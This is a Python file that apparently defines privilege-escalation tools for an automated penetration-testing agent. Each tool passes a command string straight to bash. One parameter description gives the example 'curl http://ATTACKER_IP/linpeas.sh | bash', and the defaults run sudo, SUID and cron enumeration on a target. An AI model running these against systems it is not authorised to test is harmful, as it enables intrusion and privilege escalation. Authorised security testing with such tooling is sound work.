from backend.tools.base import tool, run_command


@tool(
    name='run_linpeas',
    description='Run LinPEAS privilege escalation enumeration script on the target (via execute_command to the shell).',
    parameters={
        'type': 'object',
        'properties': {
            'command': {'type': 'string', 'description': 'Command to download and run linpeas (e.g. "curl http://ATTACKER_IP/linpeas.sh | bash")'},
        },
        'required': ['command'],
    },
    phases=['privesc'],
)
async def run_linpeas(command: str) -> str:
    return await run_command(['bash', '-c', command], timeout=300)


@tool(
    name='check_sudo',
    description='Check sudo privileges on the target.',
    parameters={
        'type': 'object',
        'properties': {
            'command': {'type': 'string', 'description': 'Command to check sudo (e.g. "sudo -l")', 'default': 'sudo -l'},
        },
        'required': [],
    },
    phases=['privesc'],
)
async def check_sudo(command: str = 'sudo -l') -> str:
    return await run_command(['bash', '-c', command])


@tool(
    name='check_suid',
    description='Find SUID binaries on the target.',
    parameters={
        'type': 'object',
        'properties': {
            'command': {'type': 'string', 'description': 'Command to find SUID binaries', 'default': 'find / -perm -4000 -type f 2>/dev/null'},
        },
        'required': [],
    },
    phases=['privesc'],
)
async def check_suid(command: str = 'find / -perm -4000 -type f 2>/dev/null') -> str:
    return await run_command(['bash', '-c', command])


@tool(
    name='check_cron',
    description='Check for cron jobs that may be exploitable.',
    parameters={
        'type': 'object',
        'properties': {
            'command': {'type': 'string', 'description': 'Command to check cron', 'default': 'cat /etc/crontab; ls -la /etc/cron.d/ 2>/dev/null; crontab -l 2>/dev/null'},
        },
        'required': [],
    },
    phases=['privesc'],
)
async def check_cron(command: str = 'cat /etc/crontab; ls -la /etc/cron.d/ 2>/dev/null; crontab -l 2>/dev/null') -> str:
    return await run_command(['bash', '-c', command])
